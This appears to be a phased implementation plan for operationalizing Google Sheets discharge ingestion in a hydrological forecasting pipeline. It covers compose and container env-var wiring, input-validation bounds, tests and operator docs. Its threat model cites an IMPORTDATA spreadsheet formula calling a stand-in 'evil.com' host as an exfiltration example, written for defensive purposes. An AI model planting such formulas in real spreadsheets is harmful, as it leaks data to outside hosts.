# Operationalize Google Sheets discharge ingestion on the pipeline server

## Problem

The Google-Sheets discharge reader implemented in commit `317bfd2` (2026-03-07,
"External site data ingestion: manual sites via Google Sheets") was declared
"Phases 1-3 done" in `doc/plans/module_issues.md:122` and backed by unit
tests, but it has never actually worked end-to-end in the operational
pipeline on any server.

Three deployment-level gaps block real use:

1. **Compose env-var propagation.** `bin/docker-compose-luigi.yml:61-69`
   defines the `preprocessing-runoff` service's `environment:` block with
   four variables — `GOOGLE_SHEETS_*` are not among them. Even when an
   operator uncomments the four vars in `.env_<org>` and the shell exports
   them via `set -a` in `read_configuration`, docker-compose does not
   forward them into the container. The Python reader then finds them unset,
   returns an empty DataFrame, and the pipeline continues silently with no
   Google-Sheets data. No exception, no alert, just missing data.

2. **No operator-facing setup instructions.** `doc/deployment.md` does not
   document where to place the service-account JSON, which env vars to set,
   or how to share the sheet. The instructions exist in
   `doc/plans/external_site_data_ingestion_plan.md:718-741` but that file
   is a design document, not the canonical server-setup guide, and it is
   not referenced from `doc/deployment.md`.

3. **Four integration-level checks in the original plan are still unticked**
   (`doc/plans/external_site_data_ingestion_plan.md` lines 380, 458, 462,
   779): full pipeline with a mock sheet, mixed iEH-HF + manual sites,
   short-term pipeline with a test manual site, full-pipeline `all`.

On top of that, two design concerns need to land in this plan explicitly:

- **Not every hydromet uses Google Sheets.** The feature must be strictly
  opt-in per organization. If the env vars are unset, partially set, or
  the credentials file is missing, the pipeline must complete normally
  for that organization — no exceptions, no missing-data crashes.
- **The sheet is semi-trusted input.** Operators with edit access to the
  sheet are authorized but fallible; a compromised account or a typo
  could inject bad values. The reader needs explicit bounds on what it
  accepts from the sheet.

## Decision

Complete operational deployment with a focused, risk-scoped plan that:

- Wires the four env vars through the compose stack to the preprocessing-
  runoff container.
- Hardens the reader against malformed or out-of-range sheet content.
- Verifies opt-in safety: organizations that do not set the env vars
  experience no behavior change and no errors.
- Documents the operator-facing setup clearly in `doc/deployment.md`.
- Adds integration tests for the env-propagation path and the
  disabled/partial-config paths.
- Ticks off the unchecked integration items in the existing design plan
  and marks the feature genuinely done.

**Explicitly out of scope** (document as known limitations, do NOT fix
here):
- `sapphire/services/` schema changes (no `data_source` column on the
  `runoffs` table — would require colleague coordination per CLAUDE.md).
- ML-module auto-training for Google-Sheets-only sites. A brand-new GS
  site with no pre-trained model, no ERA5 forcing tile, and no static
  features will receive no ML forecast. The linear-regression and
  long-term paths are unaffected.
- Non-integer site codes. `machine_learning/make_forecast.py:569` and
  `long_term_forecasting/data_interface.py:224` both cast `code` to
  `int`. Constraint: GS site codes must be int-coercible strings (already
  enforced by `google_sheets_reader.py:37` `re.fullmatch(r"\d+", token)`).
- Phase 4 of the original plan (dashboard data-entry card) — explicitly
  descoped in `doc/plans/external_site_data_ingestion_plan.md:783`.
- Write-back from SAPPHIRE to Google Sheets.

## Scope

**Files in scope:**

| File | Change |
|------|--------|
| `bin/docker-compose-luigi.yml` | Add four `GOOGLE_SHEETS_*` vars to the `preprocessing-runoff` service `environment:` block. Use `${VAR:-}` default so unset-on-host yields empty-in-container (opt-in safety). |
| `apps/pipeline/pipeline_docker.py` | **Critical — sub-container env propagation.** `PreprocessingRunoff.run()` (lines 493-518) spawns a fresh `sapphire-preprunoff` container via `execute_with_retries`; its programmatically-built `environment` list at lines 505-507 currently propagates only `ieasyhydroforecast_env_file_path`. Append the four `GOOGLE_SHEETS_*` vars to that list, sourced via `os.environ.get(...)` with empty-string default. Without this, the compose edit is a no-op — the Luigi orchestrator reads the vars but never forwards them. |
| `apps/preprocessing_runoff/src/google_sheets_reader.py` | Harden input validation: row-count cap, discharge upper-bound, date-range bounds, reject-negative-discharge, defensive handling of `None` args. |
| `apps/preprocessing_runoff/test/test_google_sheets_reader.py` | Add test cases for the new validation and for opt-in safety (env vars unset, partial, invalid). |
| `apps/pipeline/tests/test_preprocessing_runoff_gsheets_env_flow.py` (new) | Integration test proving the four env vars reach the container when set on the host, and proving the pipeline is a no-op when they are unset. Uses a stubbed `docker compose` invocation — does not require a real Docker daemon. |
| `doc/deployment.md` | New section "Google Sheets data source (optional)" covering credentials placement, env vars, sheet sharing. Placed alongside other optional-source documentation. |
| `doc/plans/external_site_data_ingestion_plan.md` | Tick off the four unchecked integration items once the integration test + manual rollout satisfy them. |
| `doc/plans/module_issues.md` | Update the PREPQ-007 entry to "Done" only after operator rollout confirms. |

**Files explicitly NOT touched:**
- `sapphire/services/**` (colleague-managed)
- `apps/machine_learning/**`, `apps/long_term_forecasting/**` (downstream
  compatibility is transparent for int-coercible codes per the audit;
  known ML-training gap is out of scope)
- `apps/forecast_dashboard/**` (Phase 4 descoped)
- `apps/config/.env_develop` — the four `GOOGLE_SHEETS_*` vars remain as
  commented stubs at lines 85-88. P4 documents how operators enable them
  in their per-organization `.env_<org>`. Leaving the template untouched
  avoids accidentally enabling GS in deployments that use `.env_develop`
  as their starting point.

## Plan

### Phase P1 — Env-var wiring (compose + Luigi sub-container)

**Goal:** Make the four `GOOGLE_SHEETS_*` env vars cross three boundaries:
shell → compose → Luigi orchestrator container → spawned `sapphire-preprunoff`
sub-container. Default behavior for organizations that do not set these
vars is unchanged (empty-string all the way through).

**Rationale for the two-file scope:** `PreprocessingRunoff.run()` in
`apps/pipeline/pipeline_docker.py:493-518` does not run
`preprocessing_runoff.py` in-process. It spawns a fresh
`sapphire-preprunoff` container via `execute_with_retries` →
`self.run_docker_container` (line 322) → `client.containers.run(...)`.
The container receives only the env vars present in the programmatically-
built `environment` list at lines 505-507. Setting the vars on the Luigi
orchestrator via the compose file makes them visible to Python code
running inside that orchestrator, but **does not** forward them to the
spawned sub-container. Both edits are required.

**Files:**
- `bin/docker-compose-luigi.yml`
- `apps/pipeline/pipeline_docker.py`

**Depends on:** none.

**Parallel agents:** 1 (**worktree isolation** — touches two files, one
of them is pipeline-critical).

**Agent instructions must include:**

**Part A — compose file**

- Open `bin/docker-compose-luigi.yml` and locate the `preprocessing-runoff`
  service definition (currently lines 61-69). Add four new entries to its
  `environment:` block, using the `${VAR:-}` pattern so unset-on-host
  produces empty-in-container (critical for opt-in safety):
  ```yaml
  - GOOGLE_SHEETS_ENABLED=${GOOGLE_SHEETS_ENABLED:-}
  - GOOGLE_SHEETS_DISCHARGE_ID=${GOOGLE_SHEETS_DISCHARGE_ID:-}
  - GOOGLE_SHEETS_CREDENTIALS_PATH=${GOOGLE_SHEETS_CREDENTIALS_PATH:-}
  - GOOGLE_SHEETS_SITE_CODES=${GOOGLE_SHEETS_SITE_CODES:-}
  ```
- **Do NOT** modify any other compose file or service block. The
  preprocessing-runoff service is the only Luigi worker that reaches the
  preprocessing_runoff codepath. Other services (`pentadal`, `decadal`,
  `long-term`, etc.) don't call `google_sheets_reader`, so unset vars
  would merely be noise there.
- **Do NOT** add a `volumes:` mount for the credentials JSON. The existing
  `pipeline-base` mount of `${ieasyhydroforecast_data_ref_dir}/config` →
  `${ieasyhydroforecast_container_data_ref_dir}/config` is sufficient —
  operators place the JSON under `<data_folder>/config/` and the reader
  finds it at the mirrored container path.
- **Do NOT** modify `bin/utils/common_functions.sh`. `set -a` in
  `read_configuration` already exports vars from the `.env` file into the
  shell; the compose `environment:` additions in this phase are what
  plumbs them into the orchestrator container.

**Part B — pipeline_docker.py sub-container env propagation**

- Open `apps/pipeline/pipeline_docker.py`. Locate the `PreprocessingRunoff`
  task class (around line 486) and its `run()` method (around lines
  493-518). Find the `environment` list literal (currently lines 505-507)
  that is passed to `execute_with_retries`.

- Before the `environment = [...]` literal, read the four vars from
  `os.environ` so they are captured at task-invocation time:
  ```python
  gsheets_enabled = os.environ.get("GOOGLE_SHEETS_ENABLED", "")
  gsheets_id = os.environ.get("GOOGLE_SHEETS_DISCHARGE_ID", "")
  gsheets_creds = os.environ.get("GOOGLE_SHEETS_CREDENTIALS_PATH", "")
  gsheets_codes = os.environ.get("GOOGLE_SHEETS_SITE_CODES", "")
  ```
  (Verify `import os` is already present at the top of the file — it
  almost certainly is for a Luigi module. If not, add it.)

- Append four entries to the existing `environment` list (exact env-var
  names must match the reader's `os.getenv` calls verbatim — no typos
  like `GOOGLE_SHEETS_CREDENTIALS` without `_PATH`):
  ```python
  environment = [
      f"ieasyhydroforecast_env_file_path={env_file_path}",
      f"GOOGLE_SHEETS_ENABLED={gsheets_enabled}",
      f"GOOGLE_SHEETS_DISCHARGE_ID={gsheets_id}",
      f"GOOGLE_SHEETS_CREDENTIALS_PATH={gsheets_creds}",
      f"GOOGLE_SHEETS_SITE_CODES={gsheets_codes}",
  ]
  ```

- Search the rest of `pipeline_docker.py` for any OTHER Luigi task class
  that runs the `sapphire-preprunoff` image or calls
  `preprocessing_runoff` code. Grep patterns: `sapphire-preprunoff`,
  `preprocessing-runoff`, `PreprocessingRunoff`. If other tasks exist
  (e.g., a maintenance or recalculation variant), apply the same env-list
  expansion. If only `PreprocessingRunoff` (the class found) uses this
  image, note that explicitly in your report.

- **Do NOT** change the function signature of `run()` or
  `execute_with_retries`.
- **Do NOT** add new imports other than `os` if already missing.
- **Do NOT** set the `GOOGLE_SHEETS_*` vars as keyword defaults in any
  task `luigi.Parameter` — they flow through the env list, not task
  parameters.
- **Do NOT** edit any tunable-threshold vars from P2
  (`GOOGLE_SHEETS_MAX_ROWS_PER_SITE`, etc.) into the env list here. Those
  are optional operator overrides; if an operator sets one in their
  `.env_<org>`, the `set -a` export plus compose `environment:` (below)
  carries them automatically. **However**, if you want to be safe: add
  them to both the compose env list and the `pipeline_docker.py` env
  list too — they would also be no-ops when unset. Your call based on
  how consistent you want the wiring. If you add them, add to BOTH
  places and match the names exactly.

**Acceptance criteria:**
- `yamllint bin/docker-compose-luigi.yml` (if installed) and
  `docker compose -f bin/docker-compose-luigi.yml config` both pass.
- `docker compose -f bin/docker-compose-luigi.yml config` output for the
  `preprocessing-runoff` service shows all four `GOOGLE_SHEETS_*` entries
  in the `environment` list.
- When the four vars are unset on the host, the rendered compose config
  shows them as empty strings (not literal `${VAR}` placeholders).
- `grep -A 10 'class PreprocessingRunoff' apps/pipeline/pipeline_docker.py`
  shows the four `GOOGLE_SHEETS_*` f-strings in the `environment` list.
- `cd apps && SAPPHIRE_TEST_ENV=True bash run_tests.sh pipeline` exits 0
  (pipeline unit tests unaffected by the env-list addition).
- A report listing every file searched for other preprunoff-using Luigi
  tasks, and whether any were found.

### Phase P2 — Harden the reader against malicious/malformed content

**Goal:** Add explicit bounds-checking to
`apps/preprocessing_runoff/src/google_sheets_reader.py` so that operator
mistakes, compromised accounts, or sheet-bombing attempts cannot propagate
bad data or exhaust resources.

**Files:**
- `apps/preprocessing_runoff/src/google_sheets_reader.py`
- `apps/preprocessing_runoff/test/test_google_sheets_reader.py`

**Depends on:** none (can run in parallel with P1).

**Parallel agents:** 1 (**worktree isolation** — reader logic change).

**Threat model (reference, not for the agent to re-derive):**
The sheet is edited by authorized operators but is still untrusted from
the pipeline's perspective. Realistic threats:
- A typo or compromised account injects impossibly large discharge
  values, corrupting the time series → downstream bad forecasts.
- A malicious or runaway sheet contains 1M+ rows, exhausting memory.
- Formula cells (e.g. `=IMPORTDATA("http://evil.com/...")`) — gspread
  returns computed values, so the formula executes on Google's side and
  its output hits our validators. Type coercion already rejects
  non-numeric discharge and malformed dates; the remaining risk is
  exfiltrating sheet content via side effects (out of our control) or
  injecting an extreme numeric payload.
- Date values far outside the plausible range (year 1500 or 3000)
  propagating to downstream modules that assume recent dates.
- Unhandled gspread exceptions (transient 5xx, quota-exceeded) crashing
  the pipeline for organizations that rely on it.

Most of these are already partially mitigated (type coercion, auth error
catch, missing-worksheet catch). Remaining gaps addressed here.

**Agent instructions must include:**
- Read the current `google_sheets_reader.py` end-to-end before editing.
  Preserve all existing behavior (empty-on-failure, per-row logging,
  summary per site). The changes below are strictly additive validations;
  do NOT remove any existing check.
- Add module-level constants near the top of the file (values chosen to
  be operationally sane, not draconian — real glacial rivers can reach
  ~5000 m³/s; 50000 is a conservative cap):
  ```python
  _DEFAULT_MAX_ROWS_PER_SITE = 10000
  _DEFAULT_MAX_DISCHARGE_M3_S = 50000.0
  _DEFAULT_MIN_DATE = "1900-01-01"
  _DEFAULT_MAX_FUTURE_DAYS = 365
  ```
  Each threshold is overridable by an env var
  (`GOOGLE_SHEETS_MAX_ROWS_PER_SITE`,
  `GOOGLE_SHEETS_MAX_DISCHARGE_M3_S`,
  `GOOGLE_SHEETS_MIN_DATE`, `GOOGLE_SHEETS_MAX_FUTURE_DAYS`) so a hydromet
  with unusual conditions can tune. Read the env vars once at the top of
  `read_discharge_from_google_sheet`, not per-row.

- **Row-count cap.** Before the `for row in records[1:]` loop at
  line 131, after fetching `records = worksheet.get_all_values()`: if
  `len(records) > max_rows + 1` (header + max_rows), log a warning
  ("Sheet for site {code} has {N} rows, exceeding cap {max_rows} — "
  "truncating") and truncate: `records = records[: max_rows + 1]`.

- **Discharge value bound.** After the `discharge_val = float(...)` parse
  (around line 155), check both lower and upper bounds:
  - `discharge_val < 0` → currently warned-and-included (lines 193-200).
    **Change to:** warned-and-rejected (skip this row, continue loop).
    Remove the post-loop negative-discharge warning block since it's now
    dead code.
  - `discharge_val > max_discharge` → warn ("Site {code}: discharge
    {value} exceeds cap {max_discharge} m³/s on {date} — likely sensor/
    entry error; skipping row") and skip.

- **Date range bound.** After the successful `pd.to_datetime` parse
  (around line 141), check:
  - `date_val < min_date` OR `date_val > now + max_future_days` → warn
    ("Site {code}: date {date_val} out of plausible range
    [{min_date}, {now + max_future_days}] — skipping row") and skip.

- **Defensive arg-type handling.** At the top of
  `read_discharge_from_google_sheet`, after the empty-DataFrame
  initialization, guard against `None` args: if any of `sheet_id`,
  `site_codes`, or `credentials_path` is `None` or an empty string (where
  applicable), log info and return empty. Do this BEFORE the `gspread is
  None` check so the opt-in "env var unset" case never reaches the
  gspread path.

- **Do NOT** add a retry loop for transient errors — that's a separate
  concern. Current behavior (catch, log, return empty) is correct for
  opt-in safety.

- **Top-level status log.** After the per-row processing completes and
  before the return, emit one INFO summary line:
  `"Google Sheets: read {total_valid} valid rows across {n_sites} sites (skipped {n_skipped} rows due to validation)"`.
  Operators use this to confirm at a glance that the feature is working
  during first-run rollout, without having to grep per-site logs.

- **Do NOT** change the function signature or return type.
- **Do NOT** add new required config — every new threshold is env-
  overridable with a sane default.

**Tests to add:**
- Row cap: sheet with `max_rows + 5` rows → reader returns exactly
  `max_rows` rows, logs truncation warning.
- Discharge too high: row with `discharge=999999.9` → row skipped,
  warning logged.
- Discharge negative: row with `discharge=-5.0` → row skipped, warning
  logged (was previously included).
- Date too old: row with `date=1800-01-01` → row skipped, warning logged.
- Date too far future: row with `date=now + 400 days` → row skipped,
  warning logged.
- Date just-in-range: row with `date=now - 1 day` and `date=now + 300
  days` → both included.
- `None` arg: call with `sheet_id=None` or `credentials_path=None` or
  `site_codes=None` → each returns empty DataFrame cleanly, no exception.
- Env-override: set `GOOGLE_SHEETS_MAX_DISCHARGE_M3_S=100000`, feed a row
  with `discharge=75000` → row INCLUDED because operator raised the cap.

**Acceptance criteria:**
- All existing tests in `test_google_sheets_reader.py` still pass
  unchanged.
- New tests pass.
- `cd apps && SAPPHIRE_TEST_ENV=True bash run_tests.sh preprocessing_runoff`
  exits 0 with zero unexpected skips.
- No regression in the logging format of existing test cases (the
  existing tests assert log substrings).

### Phase P3 — Integration test for env-flow and opt-in safety

**Goal:** Prove (a) the four env vars reach the `preprocessing-runoff`
container when set on the host via an `.env` file, (b) the pipeline is a
clean no-op when they are unset, and (c) the pipeline is a clean no-op
when they are partially set (e.g., enabled=True but creds file missing).

**Files:** `apps/pipeline/tests/test_preprocessing_runoff_gsheets_env_flow.py`
(new)

**Depends on:** P1 (needs the compose changes to exist), P2 (tests the
hardened reader behavior too, indirectly).

**Parallel agents:** 1.

**Agent instructions must include:**
- Use pytest + `subprocess.run` pattern established by the bimonthly
  skill-recalc tests (`apps/pipeline/tests/test_bimonthly_skill_recalc.py`
  — already in repo).
- **Base env-var setup.** Before invoking `docker compose config`, the
  test must set dummy values for the variables the compose file
  otherwise expects, or `docker compose config` will abort with
  "variable is not set" warnings and a non-zero exit. Minimum set:
  `ieasyhydroforecast_data_root_dir=/tmp/gs_test`,
  `ieasyhydroforecast_env_file_path=/tmp/gs_test/env`,
  `ieasyhydroforecast_backend_docker_image_tag=test`,
  plus any other `${...}` references grep'd from the compose file.
  Create the paths with `mkdir -p` if any compose setting validates
  directory existence.
- Three test cases at minimum:
  1. **All vars set:** set all four `GOOGLE_SHEETS_*` in the subprocess
     env, invoke `docker compose -f bin/docker-compose-luigi.yml config
     preprocessing-runoff` (or `--services preprocessing-runoff`),
     parse the rendered output, assert each of the four appears in the
     service's environment list with the exact value from the subprocess
     env. **No container is actually started in this test — we verify
     the wiring, not runtime behavior.** Runtime behavior is covered by
     P2's unit tests against the reader.
  2. **No vars set:** unset all four in the subprocess env, run the same
     `docker compose config` invocation, assert each of the four
     appears as an empty string (not a `${VAR}` placeholder, not
     missing entirely). This proves the opt-in default is in place.
  3. **Partial config — enabled but no creds path:** set
     `GOOGLE_SHEETS_ENABLED=True` only, unset the others. Assert the
     rendered config has `ENABLED=True` and the others empty. Then, as
     a second assertion in the same test, directly call
     `google_sheets_reader.read_discharge_from_google_sheet("", [], "")`
     and confirm it returns an empty DataFrame without raising.
- Skip the test with a clear message if `docker compose` is not
  available on the test host (`shutil.which("docker")` is None), so CI
  environments without Docker don't fail the suite.
- Do NOT require a running Docker daemon — `docker compose config` only
  renders the YAML, it doesn't start containers.

**Acceptance criteria:**
- Test passes locally with Docker installed.
- Test is skipped (not failed) on a host without Docker.
- `SAPPHIRE_TEST_ENV=True bash run_tests.sh pipeline` exits 0.

### Phase P4 — Operator documentation

**Goal:** Self-contained setup instructions in `doc/deployment.md` so an
operator provisioning a new hydromet can enable Google Sheets without
needing to read the design plan.

**Files:** `doc/deployment.md` (and cross-reference in
`doc/configuration.md` if helpful — check before touching).

**Depends on:** P1, P2 (env var names and semantics must be final).

**Parallel agents:** 1.

**Agent instructions must include:**
- Add a new subsection titled "Google Sheets data source (optional)"
  under the relevant deployment step (likely near where manual-site
  config is discussed, or alongside the `.env_<org>` setup — check the
  existing doc structure first).
- Make it **unambiguous that this is optional**. Lead with a sentence
  like "This section only applies to hydromet deployments that use a
  shared Google Sheet as a discharge data source. Organizations that do
  not use Google Sheets should leave all four `GOOGLE_SHEETS_*`
  variables unset — the pipeline will skip Google Sheets entirely with
  no additional configuration."
- Cover the steps:
  1. Creating / locating the Google Cloud service account (reference the
     instructions in
     `doc/plans/external_site_data_ingestion_plan.md:718-741` rather
     than duplicating them).
  2. Placing the JSON key file at `<data_folder>/config/
     google_sheets_sa.json` (or any name; convention not mandatory).
     Note that the file is reachable inside the container at
     `${ieasyhydroforecast_container_data_ref_dir}/config/<name>.json`
     because the `config/` dir is already mounted.
  3. Setting the four env vars in `<data_folder>/config/.env_<org>`:
     `GOOGLE_SHEETS_ENABLED=True`,
     `GOOGLE_SHEETS_DISCHARGE_ID=<spreadsheet-id>`,
     `GOOGLE_SHEETS_CREDENTIALS_PATH=${ieasyhydroforecast_container_data_ref_dir}/config/google_sheets_sa.json`,
     `GOOGLE_SHEETS_SITE_CODES=15194,15195,...` (comma-separated, digits
     only).
  4. Adding each GS-sourced site code to
     `config_all_stations_library.json` with
     `"data_source": ["google_sheets"]`.
  5. Sharing the sheet with the service account email as Viewer.
  6. Verification: run the preprocessing-runoff service manually and
     check `<data_folder>/intermediate_data/.../daily_discharge.csv` for
     the expected codes.
- Include the four tunable-threshold env vars from P2 as optional
  overrides (`GOOGLE_SHEETS_MAX_ROWS_PER_SITE`,
  `GOOGLE_SHEETS_MAX_DISCHARGE_M3_S`, `GOOGLE_SHEETS_MIN_DATE`,
  `GOOGLE_SHEETS_MAX_FUTURE_DAYS`), with default values and when an
  operator might need to override.
- Note that the JSON key lives at `<data_folder>/config/` — which is in
  the per-organization data directory (a sibling of the
  `SAPPHIRE_Forecast_Tools` repo, see
  `doc/plans/deployment_new_hydromet_aws.md:113-133`). There is
  therefore nothing for the repo's `.gitignore` to guard; the JSON is
  physically outside the repo. Operators should still protect it via
  filesystem permissions (`chmod 600 <data_folder>/config/google_sheets_sa.json`)
  and restrict sheet sharing to the service account only.
- Add a line to the verification section: "Organizations that are not
  using Google Sheets can verify the feature is safely off by running
  the preprocessing-runoff service with the vars unset and confirming
  no errors in the log."

**Acceptance criteria:**
- New subsection is present in `doc/deployment.md`.
- Section ordering and Markdown style match the surrounding doc.
- Lead sentence explicitly says the feature is optional.
- `grep -i "optional" doc/deployment.md` returns the new section's
  lead sentence.

### Phase P5 — Plan reconciliation and pre-deploy validation

**Goal:** Update the original design plan to reflect real "done" status,
and update `doc/plans/module_issues.md` to match.

**Files:**
- `doc/plans/external_site_data_ingestion_plan.md`
- `doc/plans/module_issues.md`

**Depends on:** P1, P2, P3, P4.

**Parallel agents:** 1.

**Agent instructions must include:**
- **Annotate, do not tick**, the four unchecked integration items in
  `doc/plans/external_site_data_ingestion_plan.md` lines 380, 458, 462,
  779. Next to each checkbox, append: "— partially addressed by
  env-flow integration test (P3 of
  `doc/plans/issues/review_gi_draft_infra_gsheets_operational_deployment.md`);
  full `run_locally.sh all` run deferred to operator rollout (P6)."
  The boxes stay unchecked until an operator confirms the rollout
  step succeeded; a follow-up commit after rollout can tick them.
- Add a section or a dated note at the end of
  `external_site_data_ingestion_plan.md` noting: "Deployment wiring,
  input hardening, env-flow integration test, and operator docs
  completed by the operational-deployment plan at
  `doc/plans/issues/review_gi_draft_infra_gsheets_operational_deployment.md`.
  Full-pipeline end-to-end validation is pending operator rollout."
- Update `doc/plans/module_issues.md:122` PREPQ-007 status:
  change the existing "Done" qualifier to "Code complete; deployment
  pending rollout" until the operator step in P6 has succeeded.
- Do NOT modify any code, test, or compose file in this phase.

**Acceptance criteria:**
- The four unchecked items in the design plan carry the new
  annotation but remain unticked.
- The module_issues.md entry reflects the "code complete; deployment
  pending" state.

### Phase P6 — Verification

**Goal:** Orchestrator-run sanity checks. No agent work.

**Depends on:** P1, P2, P3, P4, P5.

**Commands:**
- `cd apps && SAPPHIRE_TEST_ENV=True bash run_tests.sh preprocessing_runoff`
- `cd apps && SAPPHIRE_TEST_ENV=True bash run_tests.sh pipeline`
- `cd apps && SAPPHIRE_TEST_ENV=True bash run_tests.sh` (full suite —
  belt-and-suspenders check for cross-module regression from the
  env-var wiring changes).
- `docker compose -f bin/docker-compose-luigi.yml config > /tmp/compose_check.yml`
  and `grep -c 'GOOGLE_SHEETS_' /tmp/compose_check.yml` (expect ≥4 —
  one per var, possibly more if multiple services were updated).
- Read the new `doc/deployment.md` section end-to-end; sanity-check
  that a new operator could follow it without cross-references.

## Dependency graph

```json
{
  "phases": {
    "P1": { "depends_on": [], "parallel_agents": 1 },
    "P2": { "depends_on": [], "parallel_agents": 1 },
    "P3": { "depends_on": ["P1", "P2"], "parallel_agents": 1 },
    "P4": { "depends_on": ["P1", "P2"], "parallel_agents": 1 },
    "P5": { "depends_on": ["P1", "P2", "P3", "P4"], "parallel_agents": 1 },
    "P6": { "depends_on": ["P1", "P2", "P3", "P4", "P5"], "parallel_agents": 0 }
  }
}
```

P1 and P2 run in parallel (independent files, different concerns).
P3 and P4 run in parallel after P1+P2.
P5 after everything code-related is done.
P6 is orchestrator verification.

## Assumptions & risks (acknowledged, not fixed in this PR)

1. **ML silent-drop for GS-only sites.** A site that exists only in the
   Google Sheet (no pre-trained ML model, no ERA5 forcing tile, no
   `static_features` row) will receive no machine-learning forecast —
   `machine_learning/make_forecast.py:580` silently excludes it via the
   `get_codes_to_use` intersection. Linear-regression and long-term
   paths are unaffected. **Mitigation:** document in P4 that GS sites
   should be expected to populate only the LR and long-term forecast
   columns on the dashboard unless someone provisions ML training data
   for them separately.

2. **No `data_source` attribution in the `runoffs` table.** Once a row
   lands in the DB, its origin (GS vs. iEH HF) is lost. Audit-trail and
   per-source anomaly detection are therefore blind. Schema change
   belongs in `sapphire/services/` and is out of scope here.

3. **Formula cells still execute on Google's side.** `gspread` returns
   the computed value of `=IMPORTDATA(...)` etc. Our validators reject
   non-numeric / out-of-range results, so a formula can at most produce
   `NaN` or a warn-and-skip. The side-effect (the formula actually
   hitting an external URL) happens in Google's infrastructure and is
   outside our control; the service-account credential is unaffected.

4. **Non-integer site codes crash downstream modules.** ML and long-term
   forecasting both cast `code` to `int`. The reader's own validator
   (`re.fullmatch(r"\d+", token)`) already enforces digits-only, so
   this constraint is consistent end-to-end. **Documented in P4 as a
   requirement:** GS site codes must be digits-only strings.

5. **Cron timing collisions.** The preprocessing-runoff cron runs at
   fixed times (see `doc/deployment.md`). If the Google Sheet is being
   edited at that moment, we get whatever was saved last. Consistent
   with any edit-vs-read race; not a concern this plan addresses.

6. **Service-account credential rotation.** If the JSON expires or is
   revoked, the reader logs an auth failure and returns empty. Operators
   must monitor logs and rotate per their GCP policy. Documented in P4.

## Rollout (post-merge, operator side)

Per organization that will use Google Sheets:

1. Pull `maxat_sapphire_2` on the server. Refresh the preprunoff image:
   - If the image is pulled from Docker Hub (published tags):
     `docker pull mabesa/sapphire-preprunoff:<tag>` is sufficient —
     commit `13898f7` ensures `gspread` is baked in.
   - If the image is built locally on the server:
     `docker compose -f bin/docker-compose-luigi.yml build preprocessing-runoff`
     after pulling the repo. The updated `Dockerfile` (line 29,
     `uv sync --frozen --no-dev --extra google-sheets`) handles the
     rest.
2. Create the GCP service account and download the JSON key (see the
   new section in `doc/deployment.md`).
3. Place the JSON at `<data_folder>/config/google_sheets_sa.json`
   (exact filename is arbitrary; documented convention).
4. Uncomment and fill the four `GOOGLE_SHEETS_*` vars in
   `<data_folder>/config/.env_<org>`.
5. Add the GS site codes to `config_all_stations_library.json` with
   `"data_source": ["google_sheets"]`.
6. Share the sheet with the service account email as Viewer.
7. **First-run verification:** invoke `bash bin/run_preprocessing_runoff.sh
   <env_file>` manually, check
   `<data_folder>/intermediate_data/.../daily_discharge.csv` for the GS
   site codes, check the preprocessing-API `runoffs` table for the rows.
8. Let normal cron take over.

Per organization that will NOT use Google Sheets:

1. Pull `maxat_sapphire_2` on the server. Rebuild preprunoff image.
2. **Do nothing else.** Leave the four vars unset in `.env_<org>`. The
   reader's opt-in check returns false and the pipeline proceeds as
   before.
3. Optional sanity check: confirm the preprocessing-runoff logs do not
   contain any Google-Sheets-related error on the first run after the
   upgrade.

## Related prior art

- `doc/plans/external_site_data_ingestion_plan.md` — original design
  plan, Phases 1-3 implemented in commit `317bfd2`. Phase 4 (dashboard
  data-entry card) explicitly descoped.
- Commit `317bfd2` (2026-03-07) — implementation.
- Commit `13898f7` (2026-04-22) — bake `gspread` into the preprunoff
  Docker image by default.
- `doc/plans/module_issues.md:122` — PREPQ-007 tracking entry.
